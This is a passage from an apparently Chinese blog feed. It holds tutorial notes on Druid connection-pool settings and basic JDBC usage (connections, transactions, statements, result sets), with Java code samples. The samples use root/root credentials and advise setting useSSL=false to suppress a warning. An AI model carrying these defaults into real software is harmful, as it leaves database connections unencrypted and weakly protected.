    <content type="html"><![CDATA[<h3 id="druid配置详解"><a class="markdownIt-Anchor" href="#druid配置详解">#</a> druid 配置详解</h3><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">说明</th><th style="text-align:center">建议值</th></tr></thead><tbody><tr><td style="text-align:center">url</td><td style="text-align:center">数据库的 jdbc 连接地址。一般为连接 oracle/mysql。示例如下：</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">mysql : jdbc:mysql://ip:port/dbname?option1&amp;option2&amp;…</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">oracle : jdbc:oracle:thin:@ip:port:oracle_sid</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">username</td><td style="text-align:center">登录数据库的用户名</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">password</td><td style="text-align:center">登录数据库的用户密码</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">initialSize</td><td style="text-align:center">启动程序时，在连接池中初始化多少个连接</td><td style="text-align:center">10-50 已足够</td></tr><tr><td style="text-align:center">maxActive</td><td style="text-align:center">连接池中最多支持多少个活动会话</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">maxWait</td><td style="text-align:center">程序向连接池中请求连接时，超过 maxWait 的值后，认为本次请求失败，即连接池</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">没有可用连接，单位毫秒，设置 - 1 时表示无限等待</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">minEvictableIdleTimeMillis</td><td style="text-align:center">池中某个连接的空闲时长达到 N 毫秒后，连接池在下次检查空闲连接时，将</td><td style="text-align:center">见说明部分</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">回收该连接，要小于防火墙超时设置</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">net.netfilter.nf_conntrack_tcp_timeout_established 的设置</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">timeBetweenEvictionRunsMillis</td><td style="text-align:center">检查空闲连接的频率，单位毫秒，非正整数时表示不进行检查</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">keepAlive</td><td style="text-align:center">程序没有 close 连接且空闲时长超过 minEvictableIdleTimeMillis, 则会执</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">行 validationQuery 指定的 SQL, 以保证该程序连接不会池 kill 掉，其范围不超</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">过 minIdle 指定的连接个数。</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">minIdle</td><td style="text-align:center">回收空闲连接时，将保证至少有 minIdle 个连接.</td><td style="text-align:center">与 initialSize 相同</td></tr><tr><td style="text-align:center">removeAbandoned</td><td style="text-align:center">要求程序从池中 get 到连接后，N 秒后必须 close, 否则 druid 会强制回收该</td><td style="text-align:center">false, 当发现程序有未</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">连接，不管该连接中是活动还是空闲，以防止进程不会进行 close 而霸占连接。</td><td style="text-align:center">正常 close 连接时设置为 true</td></tr><tr><td style="text-align:center">removeAbandonedTimeout</td><td style="text-align:center">设置 druid 强制回收连接的时限，当程序从池中 get 到连接开始算起，超过此</td><td style="text-align:center">应大于业务运行最长时间</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">值后，druid 将强制回收该连接，单位秒。</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">logAbandoned</td><td style="text-align:center">当 druid 强制回收连接后，是否将 stack trace 记录到日志中</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center">testWhileIdle</td><td style="text-align:center">当程序请求连接，池在分配连接时，是否先检查该连接是否有效。(高效)</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center">validationQuery</td><td style="text-align:center">检查池中的连接是否仍可用的 SQL 语句，drui 会连接到数据库执行该 SQL, 如果</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">正常返回，则表示连接可用，否则表示连接不可用</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">testOnBorrow</td><td style="text-align:center">程序 <strong>申请</strong> 连接时，进行连接有效性检查（低效，影响性能）</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">testOnReturn</td><td style="text-align:center">程序 <strong>返还</strong> 连接时，进行连接有效性检查（低效，影响性能）</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">poolPreparedStatements</td><td style="text-align:center">缓存通过以下两个方法发起的 SQL:</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">public PreparedStatement prepareStatement(String sql)</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">public PreparedStatement prepareStatement(String sql,</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">int resultSetType, int resultSetConcurrency)</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">maxPoolPrepareStatementPerConnectionSize</td><td style="text-align:center">每个连接最多缓存多少个 SQL</td><td style="text-align:center">20</td></tr><tr><td style="text-align:center">filters</td><td style="text-align:center">这里配置的是插件，常用的插件有:</td><td style="text-align:center">stat,wall,slf4j</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">监控统计: filter:stat</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">日志监控: filter:log4j 或者 slf4j</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">防御 SQL 注入: filter:wall</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">connectProperties</td><td style="text-align:center">连接属性。比如设置一些连接池统计方面的配置。</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">比如设置一些数据库连接属性:</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><h3 id="配置示例"><a class="markdownIt-Anchor" href="#配置示例">#</a> 配置示例</h3><pre class="line-numbers language-none"><code class="language-none">driverClassName&#x3D;com.mysql.jdbc.Driverurl&#x3D;jdbc:mysql:&#x2F;&#x2F;&#x2F;db3?useSSL&#x3D;false&amp;useServerPrepStmts&#x3D;trueusername&#x3D;rootpassword&#x3D;root#初始化连接数量initialSize&#x3D;5#最大连接数maxActive&#x3D;10#最大等待时间maxWait&#x3D;3000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;druid配置详解&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#druid配置详解&quot;&gt;#&lt;/a&gt; druid 配置详解&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;属</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-JDBC</title>
    <link href="http://example.com/post/JavaWeb-JDBC.html"/>
    <id>http://example.com/post/JavaWeb-JDBC.html</id>
    <published>2022-06-22T12:55:59.000Z</published>
    <updated>2022-06-22T12:56:50.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-jdbc简介"><a class="markdownIt-Anchor" href="#1-jdbc简介">#</a> 1、JDBC 简介</h1><ul><li><p>JDBC 概念</p><ul><li>JDBC 就是使用 Java 语言操作关系型数据库的一套 API</li><li>全称：（Java DataBase Connectivity）Java 数据库连接</li></ul></li><li><p>JDBC 本质：</p><ul><li>官方（Sun 公司）定义的一套操作所有关系型数据库的规则，即接口</li><li>各个数据库厂商去实现这套接口，提供数据库驱动 jar 包</li><li>我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动 jar 包中的实现类</li></ul></li><li><p>JDBC 好处：</p><ul><li>各数据库厂商使用相同的接口，Java 代码不需要针推不同数据库分别开发</li><li>可随时替换底层数据库，访问数据库的 Java 代码基本不变</li></ul></li></ul><h1 id="2-jdbc快速入门"><a class="markdownIt-Anchor" href="#2-jdbc快速入门">#</a> 2、JDBC 快速入门</h1><h2 id="21-步骤"><a class="markdownIt-Anchor" href="#21-步骤">#</a> 2.1 步骤</h2><ol start="0"><li><p>创建工程，导入驱动 jar 包</p></li><li><p>注册驱动</p></li><li><p>获取连接</p></li><li><p>定义 SQL 语句</p></li><li><p>获取执行 SQL 对象</p></li><li><p>执行 SQL</p></li><li><p>处理返回结果</p></li><li><p>释放资源</p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>jdbc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DriverManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span><span class="token comment">/** * 快速入门 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1. 注册驱动</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2. 获取连接</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/db3"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3. 定义SQL语句</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"UPDATE ACCOUNT SET MONEY = 2000 WHERE ID = 1"</span><span class="token punctuation">;</span>        <span class="token comment">//4. 获取执行SQL的对象 statement</span>        <span class="token class-name">Statement</span> stmt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//5. 执行sql</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//返回受影响的行数</span>        <span class="token comment">//6. 处理结果</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//7. 释放资源</span>        stmt<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-jdbc-api详解"><a class="markdownIt-Anchor" href="#3-jdbc-api详解">#</a> 3、JDBC API 详解</h1><ul><li>DriverManager</li><li>Connection</li><li>Statement</li><li>ResultSet</li><li>PreparedStatement</li></ul><h2 id="31-drivermanager"><a class="markdownIt-Anchor" href="#31-drivermanager">#</a> 3.1 DriverManager</h2><ul><li>DriverManager（驱动管理类）作用：<ol><li>注册驱动</li><li>获取数据库连接</li></ol></li><li>DriverManager 是一个工具类，里面都是静态方法</li></ul><table><thead><tr><th>描述</th><th>方法名</th></tr></thead><tbody><tr><td>static Connection</td><td>getConnection(Stirng url, String user, String password)</td></tr></tbody></table><p>参数：</p><ol><li>URL：连接路径</li></ol><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>语法：jdbc:mysq://ip 地址 (域名): 端口号 / 数据库名称？参数键值对 1 &amp; 参数键值对 2</p><p>示例：jdbc:mysql://127.0.0.1:3306/db1</p><p>细节：</p><ul><li>如果连接的是本机 mysql 服务器，并且 mysql 服务默认端口号是 3306，则 url 可以简写为 jdbc:mysql/// 数据库名称？参数键值对</li><li>配置 useSSL=false 参数，禁用安全连接方式，解决警告提示:jdbc:mysql///db2?useSSL=false</li></ul></blockquote><ol start="2"><li>user：用户名</li><li>password：密码</li></ol><h2 id="32-connection"><a class="markdownIt-Anchor" href="#32-connection">#</a> 3.2 Connection</h2><ul><li><p>Connection (数据库连接对象) 作用：</p><ol><li><p>获取执行 SQL 的对象</p><ul><li>普通执行 SQL 对象 <code>Statement create Statement()</code></li><li>预编译 SQL 的执行 SQL 对象：防止 SQL 注入： <code>PreparedStatement preparedStatement(sql)</code></li><li>执行存储过程的对象： <code>CallableStatement prepareCall(sql)</code></li></ul></li><li><p>管理事务</p><ul><li><p>MySQL 事务管理</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>开启事务：BEGIN;/START TRANSACTION;</p><p>提交事务：COMMIT;</p><p>回滚事务：ROLLBACK;</p><p>MYSQL 默认自动提交事务</p></blockquote></li><li><p>JDBC 事务管理：Connection 接口中定义了 3 个对应方法</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>开启事务：setAutoCommit (boolean autoCommit)：true 为自动提交事务，false 为手动提交事务</p><p>提交事务：commit ()</p><p>回滚事务：rollback ()</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">try &#123;    <span class="token comment">//开启事务</span>    conn<span class="token punctuation">.</span>setAutoCommit<span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//执行sql1，并处理结果</span>    <span class="token keyword">int</span> count1 <span class="token operator">=</span> stmt<span class="token punctuation">.</span>executeUpdate<span class="token punctuation">(</span>sql1<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span>println<span class="token punctuation">(</span>count1<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//执行sql2，并处理结果</span>    <span class="token keyword">int</span> count2 <span class="token operator">=</span> stmt<span class="token punctuation">.</span>executeUpdate<span class="token punctuation">(</span>sql2<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span>println<span class="token punctuation">(</span>count2<span class="token punctuation">)</span><span class="token punctuation">;</span>&#125; catch <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> &#123;    <span class="token comment">//回滚事务</span>    conn<span class="token punctuation">.</span><span class="token keyword">rollback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    throw new RuntimeException<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>&#125;<span class="token comment">//提交事务</span>conn<span class="token punctuation">.</span><span class="token keyword">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ol></li></ul><h2 id="33-statement"><a class="markdownIt-Anchor" href="#33-statement">#</a> 3.3 Statement</h2><ul><li>Statement 作用：<ol><li>执行 SQL 语句</li></ol></li><li>执行 SQL 语句：</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>int executeUpdate (sql) 执行 DML，DDL 语句</p><blockquote><p>返回值：(1) DML 语句影响的行数(2) DDL 语句执行后，执行成功也可能返回 0（DDL 不报异常一般就是成功）</p></blockquote><p>ResultSet executeQuery (sql) 执行 DQL 语句</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>返回值：ResultSet 结果集对象</p></blockquote></blockquote><h2 id="34-resultset"><a class="markdownIt-Anchor" href="#34-resultset">#</a> 3.4 ResultSet</h2><ul><li><p>ResultSet (结果集对象) 作用：</p><ol><li><p>封装了 DQL 查询语句的结果</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>ResultSet stmt.executeQuery (sql): 执行 SQL 语句，返回 ResultSet 对象</p></blockquote></li></ol></li><li><p>获取查询结果</p></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 